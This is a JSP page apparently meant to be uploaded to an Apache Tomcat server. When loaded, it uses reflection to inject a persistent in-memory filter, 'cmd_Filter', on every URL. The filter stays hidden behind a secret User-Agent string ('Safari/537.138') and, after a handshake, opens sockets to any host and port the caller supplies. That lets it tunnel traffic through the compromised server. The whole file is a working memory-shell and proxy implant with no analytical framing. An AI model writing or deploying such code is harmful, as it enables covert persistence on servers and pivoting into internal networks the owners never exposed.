<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.OutputStream" %>
<%@ page import="java.net.Socket" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="org.apache.catalina.core.*" %>

<%!
    public String readCString(InputStream inputStream) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte c;
        while ((c= (byte) inputStream.read())!=0){
            buffer.write(c);
        }
        return new String(buffer.toByteArray());
    }
    public static byte[] copyOfRange(byte[] original, int from, int to) {
        int newLength = to - from;
        if (newLength < 0){
            throw new IllegalArgumentException(from + " > " + to);
        }
        byte[] copy = new byte[newLength];
        System.arraycopy(original, from, copy, 0,
                Math.min(original.length - from, newLength));
        return copy;
    }
    public static boolean equalsArray(byte[] a, byte[] a2) {
        if (a==a2){
            return true;
        }
        if (a==null || a2==null){
            return false;
        }

        int length = a.length;
        if (a2.length != length){
            return false;
        }

        for (int i=0; i<length; i++){
            if (a[i] != a2[i])
                return false;
        }

        return true;
    }

    private byte[] readInputStream(InputStream inputStream,int len)throws Throwable{
        int readNumber = 0;
        int offset = 0;
        byte[] buffer = new byte[len];
        while(offset<len&&(readNumber=(inputStream.read(buffer,offset,len)))>0){
            offset+=readNumber;
        }
        if(offset==len){
            return buffer;
        }
        return null;
    }
    class ProxyStream extends Thread{
        public InputStream inputStream;
        public OutputStream outputStream;

        public ProxyStream(InputStream inputStream, OutputStream outputStream) {
            this.inputStream = inputStream;
            this.outputStream = outputStream;
        }

        @Override
        public void run() {
            try {
                byte[] buffer=new byte[4096];
                int readNumber = 0;
                while((readNumber=inputStream.read(buffer))>0){
                    outputStream.write(buffer,0,readNumber);
                    outputStream.flush();
                }
            }catch(Exception e){
                try{
                    inputStream.close();
                }catch(Exception e2){

                }
                try{
                    outputStream.close();
                }catch(Exception e2){

                }
            }
        }
    }
%>

<%
    class t {
        String uri;
        String serverName;
        StandardContext standardContext;

        public Object getField(Object object, String fieldName) {
            Field declaredField;
            Class clazz = object.getClass();
            while (clazz != Object.class) {
                try {

                    declaredField = clazz.getDeclaredField(fieldName);
                    declaredField.setAccessible(true);
                    return declaredField.get(object);
                } catch (NoSuchFieldException | IllegalAccessException e) {

                }
                clazz = clazz.getSuperclass();
            }
            return null;
        }

        public t() {
            Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
            Object object;
            Object object2;

            for (Thread thread : threads) {

                if (thread == null) {
                    continue;
                }
                if (thread.getName().contains("exec")) {
                    continue;
                }
                Object target = this.getField(thread, "target");
                if (!(target instanceof Runnable)) {
                    continue;
                }

                try {
                    object = getField(getField(getField(target, "this$0"), "handler"), "global");
                    object2 = getField(getField(getField(getField(getField(getField(getField(target, "this$0"), "handler"), "proto"),"adapter"),"connector"),"service"),"engine");
                } catch (Exception e) {
                    continue;
                }
                if (object == null) {
                    continue;
                }
                java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
                Iterator iterator = processors.iterator();
                while (iterator.hasNext()) {
                    Object next = iterator.next();

                    Object req = getField(next, "req");
                    Object serverPort = getField(req, "serverPort");
                    if (serverPort.equals(-1)){continue;}
                    //             org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                    //              org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "defaultHost");
                    String serverNameMB = (String)getField(object2,"defaultHost");
                    this.serverName = serverNameMB;
//                    this.serverName = (String) getField(serverNameMB, "strValue");
//                    if (this.serverName == null){
//                        this.serverName = serverNameMB.toString();
//                    }
//                    if (this.serverName == null){
//                        this.serverName = serverNameMB.getString();
//                    }

                    org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "uriMB");
                    this.uri = (String) getField(uriMB, "strValue");
                    if (this.uri == null){
                        this.uri = uriMB.toString();
                    }
                    if (this.uri == null){
                        this.uri = uriMB.getString();
                    }

                    this.getStandardContext();
                    return;
                }
            }
        }

        public void getStandardContext() {
            Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
            for (Thread thread : threads) {
                if (thread == null) {
                    continue;
                }
                if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                    Object target = this.getField(thread, "target");
                    HashMap children;
                    Object jioEndPoint = null;
                    try {
                        jioEndPoint = getField(target, "this$0");
                    }catch (Exception e){}
                    if (jioEndPoint == null){
                        try{
                            jioEndPoint = getField(target, "endpoint");
                        }catch (Exception e){ return; }
                    }
                    Object service = getField(getField(getField(getField(getField(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
                    StandardEngine engine = null;
                    try {
                        engine = (StandardEngine) getField(service, "container");
                    }catch (Exception e){}
                    if (engine == null){
                        engine = (StandardEngine) getField(service, "engine");
                    }

                    children = (HashMap) getField(engine, "children");
                    StandardHost standardHost = (StandardHost) children.get(this.serverName);

                    children = (HashMap) getField(standardHost, "children");
                    Iterator iterator = children.keySet().iterator();
                    while (iterator.hasNext()){
                        String contextKey = (String) iterator.next();
                        if (!(this.uri.startsWith(contextKey))){continue;}
                        StandardContext standardContext = (StandardContext) children.get(contextKey);
                        this.standardContext = standardContext;
                        return;
                    }
                }
            }
        }

        public StandardContext getSTC(){
            return this.standardContext;
        }
    }

%>


<%

    Field Configs = null;
    Map filterConfigs;
    try {
        t a = new t();
        StandardContext standardContext = a.getSTC();
        String FilterName = "cmd_Filter";
        Configs = standardContext.getClass().getDeclaredField("filterConfigs");
        Configs.setAccessible(true);
        filterConfigs = (Map) Configs.get(standardContext);

        if (filterConfigs.get(FilterName) == null){
            Filter filter = new Filter() {

                @Override
                public void init(FilterConfig filterConfig) throws ServletException {

                }

                @Override
                public void doFilter(ServletRequest req, ServletResponse resp, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest request = (HttpServletRequest) req;
                    HttpServletResponse response = (HttpServletResponse) resp;

                    String pass = request.getHeader("user-agent");
                    if (!"POST".equals(request.getMethod()) && pass.indexOf("Safari/537.138") != -1 ){
                        response.getWriter().write("hello");
                        filterChain.doFilter(req,resp);
                    }
                    if (pass.indexOf("Safari/537.138") != -1){
                        InputStream inputStream=request.getInputStream();
                        String str1 = inputStream.toString();
                        response.setHeader("Transfer-Encoding","chunked");
                        response.setBufferSize(1024);
                        OutputStream outputStream=response.getOutputStream();
                        String str2 = outputStream.toString();
                        try {
                            byte[] handshake = readInputStream(inputStream,16);
                            if (handshake!=null){
                                outputStream.write(handshake);
                                outputStream.flush();
                                byte[] handshake2 = readInputStream(inputStream,8);

                                if (equalsArray(copyOfRange(handshake,0,8),handshake2)){
                                    outputStream.write(handshake2);
                                    outputStream.flush();
                                    String host = readCString(inputStream);
                                    int port = Integer.parseInt(readCString(inputStream));
                                    try {
                                        Socket socket = new Socket(host,port);
                                        OutputStream socketOutput = socket.getOutputStream();
                                        InputStream socketInput = socket.getInputStream();
                                        outputStream.write(0x01);
                                        outputStream.flush();
                                        Thread thread = new ProxyStream(inputStream, socketOutput);
                                        Thread thread2 = new ProxyStream(socketInput, outputStream);
                                        thread.start();
                                        thread2.start();
                                        thread.join();
                                        thread2.join();
                                    }catch (IOException e){
                                        outputStream.write(0x02);
                                        outputStream.write(e.getMessage().getBytes());
                                        outputStream.write(0x00);
                                    }
                                }
                            }
                        }catch (Throwable e){
                            System.out.println("error");
                        }
                        try {
                            inputStream.close();
                        }catch (IOException ioException){

                        }
                        try {
                            outputStream.close();
                        }catch (IOException ioException){
                        }
                    }
                    else {
                        filterChain.doFilter(req,resp);
                    }
                    System.out.println("filter!");
                }

                @Override
                public void destroy() {

                }
            };

            Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
            FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
            o.setFilter(filter);
            o.setFilterName(FilterName);
            o.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(o);

            Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
            org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();

            o1.addURLPattern("/*");
            o1.setFilterName(FilterName);
            o1.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(o1);

            Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
            Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
            declaredConstructor1.setAccessible(true);
            ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
            filterConfigs.put(FilterName,filterConfig);
            response.getWriter().write("Success");
        }
    }
    catch (Exception e) {
        e.printStackTrace();
    }

%>